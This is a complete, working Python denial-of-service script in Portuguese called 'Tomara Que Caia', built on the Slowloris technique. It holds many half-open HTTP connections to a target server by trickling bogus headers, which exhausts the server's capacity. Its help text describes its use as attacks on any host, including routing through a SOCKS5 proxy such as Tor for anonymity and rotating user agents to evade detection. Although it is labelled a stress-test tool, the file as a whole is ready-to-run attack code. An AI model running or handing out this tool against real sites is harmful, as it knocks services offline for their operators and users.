#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time
import pyfiglet
from termcolor import colored

def imprimir_instrucoes():
    figlet_text = pyfiglet.figlet_format("Tomara Que Caia : )")
    colored_text = colored(figlet_text, 'red')
    print(colored_text)
    
    instrucoes = """
    Instruções de Uso do Tomara que Caia:

    python3 tomara_que_caia.py <host> [opções]

    Argumentos Posicionais:
    <host>                Host para realizar o teste de estresse

    Opções:
    -p, --porta           Porta do servidor web, geralmente 80 (default: 80)
    -s, --sockets         Número de sockets a serem usados no teste (default: 150)
    -v, --verbose         Aumenta o nível de log
    -ua, --randuseragents Aleatoriza os user-agents em cada requisição
    -x, --useproxy        Usar um proxy SOCKS5 para conexão
    --proxy-host          Host do proxy SOCKS5 (default: 127.0.0.1)
    --proxy-port          Porta do proxy SOCKS5 (default: 8080)
    --https               Usar HTTPS para as requisições
    --sleeptime           Tempo de espera entre cada cabeçalho enviado (default: 15 segundos)

    Exemplos de uso:
    1. Ataque simples em um host:
       python3 tomara_que_caia.py example.com

    2. Ataque em um host usando HTTPS e 200 sockets:
       python3 tomara_que_caia.py example.com --https -s 200

    3. Ataque em um host usando um proxy SOCKS5:
       python3 tomara_que_caia.py example.com --useproxy --proxy-host 127.0.0.1 --proxy-port 9050

    """
    print(instrucoes)

parser = argparse.ArgumentParser(
    description="Tomara que Caia, ferramenta de teste de estresse de baixa largura de banda para sites",
    add_help=False
)
parser.add_argument("host", nargs="?", help="Host para realizar o teste de estresse")
parser.add_argument(
    "-p", "--porta", default=80, help="Porta do servidor web, geralmente 80", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=150,
    help="Número de sockets a serem usados no teste",
    type=int,
)
parser.add_argument(
    "-v",
    "--verbose",
    dest="verbose",
    action="store_true",
    help="Aumenta o nível de log",
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Aleatoriza os user-agents em cada requisição",
)
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Usar um proxy SOCKS5 para conexão",
)
parser.add_argument(
    "--proxy-host", default="127.0.0.1", help="Host do proxy SOCKS5"
)
parser.add_argument(
    "--proxy-port", default="8080", help="Porta do proxy SOCKS5", type=int
)
parser.add_argument(
    "--https",
    dest="https",
    action="store_true",
    help="Usar HTTPS para as requisições",
)
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=15,
    type=int,
    help="Tempo de espera entre cada cabeçalho enviado.",
)
parser.add_argument(
    "-h", "--help", action="help", default=argparse.SUPPRESS,
    help="Mostra esta mensagem de ajuda e sai"
)
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

if len(sys.argv) <= 1:
    imprimir_instrucoes()
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host necessário!")
    imprimir_instrucoes()
    parser.print_help()
    sys.exit(1)

if args.useproxy:
    try:
        import socks

        socks.setdefaultproxy(
            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
        )
        socket.socket = socks.socksocket
        logging.info("Usando proxy SOCKS5 para conexão...")
    except ImportError:
        logging.error("Biblioteca de Proxy Socks Não Disponível!")
        sys.exit(1)

logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)


def enviar_linha(self, linha):
    linha = f"{linha}\r\n"
    self.send(linha.encode("utf-8"))


def enviar_cabecalho(self, nome, valor):
    self.send_line(f"{nome}: {valor}")


if args.https:
    logging.info("Importando módulo ssl")
    import ssl

    setattr(ssl.SSLSocket, "send_line", enviar_linha)
    setattr(ssl.SSLSocket, "send_header", enviar_cabecalho)

lista_de_sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

setattr(socket.socket, "send_line", enviar_linha)
setattr(socket.socket, "send_header", enviar_cabecalho)


def inicializar_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if args.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.host)

    s.connect((ip, args.porta))

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = user_agents[0]
    if args.randuseragent:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s


def iteracao_tomara_que_caia():
    logging.info("Enviando cabeçalhos keep-alive...")
    logging.info("Contagem de sockets: %s", len(lista_de_sockets))

    # Tenta enviar uma linha de cabeçalho para cada socket
    for s in list(lista_de_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            lista_de_sockets.remove(s)

    # Alguns dos sockets podem ter sido fechados devido a erros ou timeouts.
    # Recrie novos sockets para substituí-los até alcançarmos o número desejado.

    diff = args.sockets - len(lista_de_sockets)
    if diff <= 0:
        return

    logging.info("Criando %s novos sockets...", diff)
    for _ in range(diff):
        try:
            s = inicializar_socket(args.host)
            if not s:
                continue
            lista_de_sockets.append(s)
        except socket.error as e:
            logging.debug("Falha ao criar novo socket: %s", e)
            break


def main():
    ip = args.host
    qtd_sockets = args.sockets
    logging.info("Atacando %s com %s sockets.", ip, qtd_sockets)

    logging.info("Criando sockets...")
    for _ in range(qtd_sockets):
        try:
            logging.debug("Criando socket nr %s", _)
            s = inicializar_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        lista_de_sockets.append(s)

    figlet_text = pyfiglet.figlet_format("Tomara Que Caia : )")
    colored_text = colored(figlet_text, 'red')
    print(colored_text)

    while True:
        try:
            iteracao_tomara_que_caia()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Parando Tomara que Caia")
            break
        except Exception as e:
            logging.debug("Erro na iteração do Tomara que Caia: %s", e)
        logging.debug("Dormindo por %d segundos", args.sleeptime)
        time.sleep(args.sleeptime)


if __name__ == "__main__":
    main()